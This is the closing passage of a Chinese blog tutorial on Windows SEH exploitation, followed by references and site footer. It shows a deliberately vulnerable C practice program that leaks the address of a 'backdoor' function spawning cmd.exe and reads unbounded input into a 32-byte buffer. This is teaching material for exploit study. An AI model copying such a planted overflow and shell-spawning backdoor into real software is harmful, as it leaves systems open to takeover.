+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> {</span><br><span class="line">	system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">}  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">{</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">int</span> x = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> z;</span><br><span class="line">	<span class="type">char</span> tmp[<span class="number">0x20</span>];</span><br><span class="line">	_try {</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"0x%p\n"</span>, backdoor);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s"</span>, tmp);</span><br><span class="line">	}</span><br><span class="line">	_except (<span class="number">1</span>) {</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"seh"</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后依旧成功利用，所以以后控制SEH之后可以直接引发一些异常即可</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这里主要学习了SEH，如何去控制SEH来达到劫持程序流的目的，攻击SEH是当年最流行的手法，所以window也发布了对应的加固手法，SAFESEH和SEHOP，后面将会学习SEHOP和SAFESEH的利用</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>逆向工程核心原理</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/azraelxuemo/article/details/122873073">https://blog.csdn.net/azraelxuemo/article/details/122873073</a></p>
+<p><a target="_blank" rel="noopener" href="https://codeantenna.com/a/wBulZH0YEb">https://codeantenna.com/a/wBulZH0YEb</a></p>
+<p><a target="_blank" rel="noopener" href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/</a></p>
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">win pwn初探（四）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSEH"><span class="toc-number">1.1.</span> <span class="toc-text">什么是SEH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SEH%E9%87%8C%E9%9D%A2%E9%95%BF%E4%BB%80%E4%B9%88%E6%A0%B7%E5%AD%90"><span class="toc-number">1.2.</span> <span class="toc-text">SEH里面长什么样子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87SEH%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.3.</span> <span class="toc-text">如何通过SEH来控制程序</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;text=win pwn初探（四）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;is_video=false&amp;description=win pwn初探（四）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=win pwn初探（四）&amp;body=Check out this article: http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;name=win pwn初探（四）&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;t=win pwn初探（四）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2023
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
